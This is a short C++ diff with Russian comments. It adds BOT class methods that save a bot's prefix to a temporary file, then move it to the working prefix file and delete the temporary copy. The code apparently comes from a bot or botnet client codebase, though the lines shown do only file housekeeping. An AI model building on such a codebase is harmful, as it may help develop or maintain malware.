@@ -1023,6 +1023,36 @@ void BOT::DeleteSettings()
 
 
 //----------------------------------------------------
+// Функция сохраняет префикс бота во временный файл
+//----------------------------------------------------
+void BOT::SavePrefixToTemporaryFile()
+{
+	string FileName = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
+	SavePrefixToFile(FileName.t_str());
+}
+//----------------------------------------------------------------------------
+
+//----------------------------------------------------
+// Функция загружает префикс бота из временного файла
+// сохраняет его в рабочий файл и удаляет временный
+//----------------------------------------------------
+void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
+{
+	string PrefixFile = Bot->PrefixFileName();
+	if (IgnoreIfExists && File::IsExists(PrefixFile.t_str()))
+		return;
+
+	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
+
+	string Prefix = LoadPrefixFromFile(TempName.t_str());
+	if (!Prefix.IsEmpty())
+		SavePrefixToFile(PrefixFile.t_str());
+	pDeleteFileA(TempName.t_str());
+}
+
+
+
+//----------------------------------------------------
 //  Функция установки/получения типа бота
 //----------------------------------------------------
 void BOT::SetBotType(TBotType Type)
